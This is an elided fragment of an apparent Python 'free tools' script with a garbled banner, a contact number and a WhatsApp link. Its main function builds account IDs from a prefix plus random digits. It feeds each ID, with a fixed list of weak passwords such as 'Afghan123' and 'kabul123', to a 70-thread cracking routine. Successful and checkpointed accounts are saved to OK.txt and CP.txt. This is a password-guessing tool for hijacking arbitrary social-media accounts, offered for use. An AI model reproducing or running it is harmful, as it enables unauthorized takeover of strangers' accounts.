...
logo=("""
  ...
  WELCOME TO MY FREE TOOLS ð¥
  âââââââââââââââââââââââââââââââââââââââââââââââââ    
\33[1;37m----------------------------------------------
â   Owner      :  RTA GHANI 
â  Facebook :  USMAN ALI KHAN 
âTELEGRAM: 93731498976
â   Tools       :  RANDOM 
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93731498976text=SN.JANðð°Sirðªð')
	if riaz1 =='3':
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Û±Û²Û³Û´ÛµÛ¶']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
